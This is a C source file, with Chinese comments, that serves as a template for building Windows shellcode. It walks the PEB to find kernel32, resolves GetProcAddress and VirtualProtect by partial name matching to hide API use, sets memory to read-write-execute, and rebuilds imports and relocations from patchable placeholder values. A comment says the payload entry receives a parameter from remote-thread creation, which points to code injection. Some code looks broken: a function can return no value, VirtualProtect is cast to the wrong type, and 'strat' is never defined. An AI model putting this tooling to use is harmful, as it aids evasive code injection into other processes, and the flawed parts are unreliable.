#include <windows.h>

typedef HMODULE(WINAPI* pGetModuleHandle)(
	_In_ LPCSTR lpLibFileName
	);
pGetModuleHandle ReGetModuleHandle;

typedef HMODULE(WINAPI* pReLoadLibrary)(
	_In_ LPCSTR lpLibFileName
	);
pReLoadLibrary ReLoadLibrary;

typedef FARPROC(WINAPI *pGetProcAddress)(
	_In_ HMODULE hModule,
	_In_ LPCSTR lpProcName
	);
pGetProcAddress ReGetProcAddress;

typedef BOOL(WINAPI* pVirtualProtect) (
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

DWORD GetKernel32Address() {
	DWORD dwKernel32Addr = 0;
	_asm {
		mov eax, fs: [0x30]
		mov eax, [eax + 0x0c]
		mov eax, [eax + 0x14]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x10]
		mov dwKernel32Addr, eax
	}
	return  dwKernel32Addr;
}

DWORD RGetProcAddress(BYTE type) {
	DWORD dwAddrBase = GetKernel32Address();

	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dwAddrBase;

	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos->e_lfanew + dwAddrBase);

	PIMAGE_DATA_DIRECTORY pDataDir = pNt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;

	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(dwAddrBase + pDataDir->VirtualAddress);

	DWORD dwFunCount = pExport->NumberOfFunctions;

	DWORD dwFunNameCount = pExport->NumberOfNames;

	PDWORD pAddrOfFun = (PDWORD)(pExport->AddressOfFunctions + dwAddrBase);

	PDWORD pAddrOfNames = (PDWORD)(pExport->AddressOfNames + dwAddrBase);

	PWORD pAddrOfOrdinals = (PWORD)(pExport->AddressOfNameOrdinals + dwAddrBase);
	for (size_t i = 0; i < dwFunCount; i++) {
		if (!pAddrOfFun[i]) {
			continue;
		}
		DWORD dwFunAddrOffset = pAddrOfFun[i];
		for (size_t j = 0; j < dwFunNameCount; j++) {
			if (pAddrOfOrdinals[j] == i) {
				DWORD dwNameOffset = pAddrOfNames[j];
				char * pFunName = (char *)(dwAddrBase + dwNameOffset);
				if (type == 1)
				{
					if (strlen(pFunName)== 14 && pFunName[0] == 'G' && pFunName[7] == 'A') {
						return dwFunAddrOffset + dwAddrBase;
					}
				}
				else if (type == 2)
				{
					if (strlen(pFunName) == 14 && pFunName[0] == 'V' && pFunName[7] == 'P') {
						return dwFunAddrOffset + dwAddrBase;
					}
				}
			}
		}
	}
}

void getAPIBaseAddr()
{
	HMODULE hKernel32 = (HMODULE)GetKernel32Address();

	ReGetProcAddress = (pGetProcAddress)RGetProcAddress(1);

	ReGetModuleHandle = (pGetModuleHandle)ReGetProcAddress(hKernel32, "GetModuleHandleA");

	ReLoadLibrary = (pGetModuleHandle)ReGetProcAddress(hKernel32, "LoadLibraryA");
}

__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }

void changeProtect(DWORD imageBase, DWORD size)
{
	HMODULE hKernel32 = (HMODULE)GetKernel32Address();

	pGetProcAddress virtualPro = (pGetProcAddress)RGetProcAddress(2);

	DWORD dwOld = 0;
	virtualPro(imageBase, size, PAGE_EXECUTE_READWRITE, &dwOld);
}

void fixIatAndReloc(DWORD imageBase)
{
	DWORD relocBeginOffset = 0x99999999;
	DWORD relocEndOffset = 0x88888888;

	changeProtect(imageBase, 0x1000);

	if (relocBeginOffset != 0x99999999)
	{
		for (DWORD i = relocBeginOffset; i < relocEndOffset; i += 2)
		{
			(*(PDWORD)(imageBase + *(PWORD)(imageBase + i))) += imageBase;
		}
	}

	DWORD iatInfoOffset = 0x77777777;
	DWORD iatBeginOffset = 0x66666666;

	if (iatInfoOffset != 0x77777777)
	{
		getAPIBaseAddr();

		DWORD index = imageBase + iatInfoOffset;
		BYTE split;
		BOOL flag = TRUE;
		HMODULE dllBase = NULL;

		while (1)
		{
			if (flag)
			{
				char* dllName = index;
				dllBase = ReGetModuleHandle(dllName);
				if (!dllBase)
					dllBase = ReLoadLibrary(dllName);

				index += (strlen(dllName) + 1);
			}

			split = *(PBYTE)(index);


			if (split == '\x2C')
			{
				char* apiName = (char*)(index + 1);
				
				*(PDWORD)(imageBase + iatBeginOffset) = ReGetProcAddress(dllBase, apiName);

				iatBeginOffset += 4;
				index += (strlen(apiName) + 1) + 1;

				flag = FALSE;
			}
			else if (split == '\x3B')
			{
				index++;
				flag = TRUE;
			}
			else {
				break;
			}
		}
	}
}

//生成shellcode时运行入口
int main(LPVOID param)
{
	ULONG_PTR loadAddress = caller();
	DWORD imageBase = loadAddress - 0xB;
	fixIatAndReloc(imageBase);

	strat(param);//这里放需要生成的shellcode代码，可以放在多个函数中，只要被引用即可。参数可带不可带，带了参数是接收远程线程创建的时给的参数。
}

//测试正常代码运行情况
//int main(int argc, char * argv[])
//{
//	strat(argv[1]);
//}